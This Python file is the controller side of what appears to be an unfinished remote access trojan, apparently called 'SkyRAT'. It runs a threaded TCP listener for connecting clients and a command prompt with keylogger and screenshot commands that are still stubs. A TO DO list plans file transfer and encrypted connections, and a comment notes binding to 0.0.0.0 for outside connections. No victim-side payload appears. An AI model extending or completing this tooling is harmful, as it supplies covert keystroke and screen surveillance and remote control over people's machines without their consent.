import socket
import threading
import sys

# TO DO LIST
# add file download upload
# encrypt the connection
# beautify terminal
# send commands to the client side to start the modules

prompt = "$ "

def handle_client(client_socket, addr):
    try:
        print(f"\n[+] Connection from {addr}")
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            message = data.decode('utf-8')
            sys.stdout.write(f"\n[Received from {addr}]: {message}\n{prompt}")
            sys.stdout.flush()
    except Exception as e:
        print(f"\n[!] Error with client {addr}: {e}")
    finally:
        client_socket.close()
        print(f"\n[-] Connection with {addr} closed\n{prompt}", end="")
        sys.stdout.flush()

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    sys.stdout.write(f"TCP Server listening on {host}:{port}\n{prompt}")
    sys.stdout.flush()

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.close()

def terminal(args):
    def help_command():
        print("Available commands:", ", ".join(commands.keys()))

    def keylogger_command():
        print("keylogger started")
        # will send command to the client side to start the keylogger module

    def screenshot_command():
        print("screenshot started")
        # will send command to the client side to start the screenshot module

    def exit_command():
        print("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "exit": exit_command,
    }

    command = commands.get(args)
    if command:
        command()
    else:
        print("Invalid command. Available commands:", ", ".join(commands.keys()))

def get_valid_port():
    host = 'localhost'  # must be 0.0.0.0 for outer connections. localhost for test purposes.
    while True:
        port_input = input("Enter port number to start the server: ")
        try:
            port = int(port_input)
            if 1024 <= port <= 65535:
                return host, port
            else:
                print("Port number must be between 1024 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a valid integer.")

if __name__ == "__main__":
    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

    """)

    host, port = get_valid_port()

    # Start server listener
    listening_thread = threading.Thread(target=start_server, args=(host, port), daemon=True)
    listening_thread.start()

    try:
        while True:
            user_command = input(f"\n{prompt}")
            terminal(user_command)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting...")
